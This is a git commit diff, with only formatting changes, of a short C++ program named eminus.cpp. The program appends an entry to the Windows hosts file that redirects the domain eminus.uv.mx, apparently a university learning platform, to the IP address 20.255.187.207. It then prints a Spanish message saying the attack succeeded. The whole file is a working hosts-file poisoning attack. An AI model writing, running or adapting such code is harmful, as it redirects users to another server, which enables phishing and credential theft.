24cf1a76f5a15b97a7742fccc39e7e5c04758bb9
ᓚᘏᗢ michelle ! <96703919+fairyofshampoo@users.noreply.github.com>
2024-08-29 21:30:25 -0600

    indentacion

--- eminus.cpp
+++ eminus.cpp
@@ -2,20 +2,21 @@
 #include <fstream>
 using namespace std;
 
-int main(){
+int main()
+{
     ofstream myfile("C:\\Windows\\System32\\drivers\\etc\\hosts", ios::out | ios::app);
-    if (myfile.is_open()){
+    if(myfile.is_open())
+    {
         myfile << "\n20.255.187.207 eminus.uv.mx";
         myfile.close();
-        cout << "Ataque realizado con exito!!!\n";
+        cout << "Ataque realizado con éxito!!!!\n";
     }
     else
     {
-        cout << "El programa requiere permisos de administrador.\n";
+        cout << "El programa requiere permisos de administrador. \n";
     }
 
-    cout<<"Presione la tecla enter para salir...\n";
+    cout << "Presione la tecla para salir ... \n";
     cin.get();
     return 0;
-
 }
